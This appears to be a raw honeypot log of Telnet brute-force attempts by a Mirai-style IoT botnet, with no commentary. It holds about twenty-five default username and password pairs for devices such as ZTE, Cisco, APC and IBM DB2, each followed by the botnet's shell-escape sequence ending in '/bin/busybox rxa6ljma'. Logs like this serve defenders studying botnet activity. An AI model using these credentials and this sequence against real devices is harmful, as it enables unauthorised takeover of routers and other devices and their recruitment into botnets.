cisco
enable
system
shell
sh
/bin/busybox rxa6ljma
root

vmware
enable
system
shell
sh
/bin/busybox rxa6ljma
gamez

lrkr0x
enable
system
shell
sh
/bin/busybox rxa6ljma
citel
enable
system
shell
sh
/bin/busybox rxa6ljma
craft

crftpw
enable
system
shell
sh
/bin/busybox rxa6ljma
jill
enable
system
shell
sh
/bin/busybox rxa6ljma
manager

friend
enable
system
shell
sh
/bin/busybox rxa6ljma
db2fenc1

ibmdb2
enable
system
shell
sh
/bin/busybox rxa6ljma
root

qwe123
enable
system
shell
sh
/bin/busybox rxa6ljma
informix

informix
enable
system
shell
sh
/bin/busybox rxa6ljma
iclock

timely
enable
system
shell
sh
/bin/busybox rxa6ljma
apc

apc
enable
system
shell
sh
/bin/busybox rxa6ljma
root

changemenow
enable
system
shell
sh
/bin/busybox rxa6ljma
root

antslq
enable
system
shell
sh
/bin/busybox rxa6ljma
root

zte521
enable
system
shell
sh
/bin/busybox rxa6ljma
root

tl789
enable
system
shell
sh
/bin/busybox rxa6ljma
root

openvpnas
enable
system
shell
sh
/bin/busybox rxa6ljma
admin

diamond
enable
system
shell
sh
/bin/busybox rxa6ljma
operator
enable
system
shell
sh
/bin/busybox rxa6ljma
netics
enable
system
shell
sh
/bin/busybox rxa6ljma
root
enable
system
shell
sh
/bin/busybox rxa6ljma
root

password
enable
system
shell
sh
/bin/busybox rxa6ljma
intrastack

asante
enable
system
shell
sh
/bin/busybox rxa6ljma
root

666666
enable
system
shell
sh
/bin/busybox rxa6ljma
